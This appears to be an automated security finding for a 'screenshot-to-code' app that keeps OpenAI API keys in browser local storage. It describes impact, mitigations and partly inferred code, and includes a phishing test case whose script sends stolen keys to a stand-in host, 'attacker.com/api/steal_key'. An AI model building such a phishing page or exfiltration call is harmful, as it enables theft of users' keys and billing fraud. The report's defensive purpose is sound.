* Vulnerability name: Insecure Storage of OpenAI API Keys in Browser Local Storage
* Description:
    1. The application prompts users to enter their OpenAI API keys in the settings dialog.
    2. These API keys are stored in the browser's local storage.
    3. While local storage is client-side and not directly accessible by other websites, it is vulnerable to attacks such as:
        - JavaScript-based attacks (e.g., Cross-Site Scripting - XSS, if the application were to become vulnerable to it in the future).
        - If the user's browser or machine is compromised by malware, the local storage data can be accessed.
        - Most importantly in the context of the described attack vector, a phishing website mimicking this application could trick users into entering their API keys. If a user enters their API key into a fake website, that malicious site's JavaScript can easily access and exfiltrate the key, as it is stored in the local storage of the browser within the context of that fake website.
    4. An attacker can create a phishing website that looks identical to the legitimate application.
    5. Unsuspecting users might enter their OpenAI API keys into this phishing website, believing it to be the real application.
    6. The phishing website's JavaScript can then retrieve the API key from the local storage and send it to the attacker's server.
* Impact:
    - **Loss of OpenAI API Keys:**  Attackers can steal users' OpenAI API keys.
    - **Financial Loss:** If the stolen API keys are used to make requests to the OpenAI API, the legitimate users will be billed for these requests, leading to financial loss.
    - **Data Breach (Potential):** Depending on the scope of access granted by the API key and the capabilities of the AI models, attackers might potentially gain access to or manipulate data accessible through the OpenAI API.
* Vulnerability rank: High
* Currently implemented mitigations:
    - **Client-side Storage:** The application stores the API key only in the user's browser local storage, as stated in `Troubleshooting.md`: "Your key is only stored in your browser. Never stored on our servers." This is mentioned as a privacy feature but doesn't prevent client-side theft if the user is tricked into using a malicious site.
    - **No Backend Storage:** The backend code does not store or log the API keys, which limits the exposure if the backend itself is compromised.
* Missing mitigations:
    - **Input Validation and Sanitization on Frontend:** While not directly related to storage security, robust input validation on the frontend could help prevent potential future XSS vulnerabilities that could be used to steal local storage data.
    - **Phishing Awareness Education:**  Educating users about the risks of phishing attacks and how to identify fake websites is crucial. This could be in the form of warnings on the website, blog posts, or FAQs.
    - **Secure API Key Handling Guidance:** Provide clear guidance to users on best practices for handling API keys, such as using separate, limited-access API keys specifically for this application, and monitoring API usage.
    - **Consider More Secure Storage (Potentially Overkill for this project):** For highly sensitive applications, consider more secure client-side storage mechanisms if feasible and necessary, though local storage is the common approach for client-side settings. However, for API keys, especially with financial implications, more robust methods might be considered in other contexts. For this project, focusing on preventing phishing and user education is likely more effective.
* Preconditions:
    - User visits a phishing website that mimics the legitimate "screenshot-to-code" application.
    - User is tricked into entering their OpenAI API key into the settings dialog of the phishing website.
* Source code analysis:
    1. **Frontend Settings Dialog:** The frontend code (not provided in PROJECT FILES, but inferred from the description and `README.md`) likely contains a settings dialog where users input their OpenAI API key. This dialog will have JavaScript code to:
        - Read the API key from the input field.
        - Store the API key in the browser's local storage using `localStorage.setItem('openAiApiKey', apiKey)`.
    2. **Frontend API Request:** When the user uses the application, the frontend JavaScript code retrieves the API key from local storage using `localStorage.getItem('openAiApiKey')`.
    3. **Backend API Call:** The frontend then sends the API key to the backend as part of the request headers or body when calling the backend API endpoints (e.g., `/generate-code` websocket route in `backend\routes\generate_code.py`). The backend then uses this API key to authenticate with OpenAI.
    4. **No Backend Storage:** Review of the backend code (`backend\config.py`, `backend\routes\generate_code.py`, `backend\llm.py`) confirms that the backend only receives and uses the API key for the duration of the request and does not store it in any persistent storage or logs.
    5. **`Troubleshooting.md` and `README.md`:** These documentation files instruct users to obtain and enter their OpenAI API keys, and `Troubleshooting.md` mentions client-side storage. This confirms the application's intended design of client-side API key handling.

* Security test case:
    1. **Setup Phishing Website:** Create a simple HTML page that visually mimics the "screenshot-to-code" application's frontend, particularly the settings dialog where the API key is entered. Host this phishing page on a publicly accessible URL (e.g., using a free hosting service or ngrok for testing).
    2. **Add Malicious JavaScript to Phishing Website:** Include JavaScript code in the phishing website that does the following:
        - Creates a fake settings dialog similar to the real application.
        - When a user enters an API key and clicks "Save" (or similar), the JavaScript:
            - Stores the API key in the phishing website's local storage (just like the real app).
            - **Exfiltrates the API key:** Sends the API key to an attacker-controlled server. This could be done via `fetch()` or `XMLHttpRequest()` to a URL like `https://attacker.com/api/steal_key?key=<api_key>`.
            - Optionally, redirects the user to the legitimate "screenshot-to-code" website to further deceive them.
    3. **Distribute Phishing Link:**  Share the link to the phishing website with a test user (or simulate a user visiting it).
    4. **Test User Interaction:** The test user visits the phishing website and, believing it to be the real application, enters their valid OpenAI API key into the fake settings dialog and "saves" it.
    5. **Attacker Server Verification:** Check the attacker-controlled server's logs or database to confirm that the API key entered by the test user was successfully received and stolen.
    6. **Local Storage Check (Phishing Site):** Inspect the local storage of the phishing website in the test user's browser to confirm the API key is stored there (as the malicious JavaScript mimics the real app's storage behavior).
    7. **Local Storage Check (Legitimate Site):**  (Optional) If the user was redirected to the real application, check the local storage of the legitimate "screenshot-to-code" website to confirm that *it* did *not* receive the API key from the phishing site (local storage is origin-based, so the phishing site's local storage is separate).

This test case will demonstrate that an attacker can successfully steal OpenAI API keys from users who are tricked into using a phishing website mimicking the "screenshot-to-code" application, due to the application's reliance on browser local storage and lack of phishing protection mechanisms.
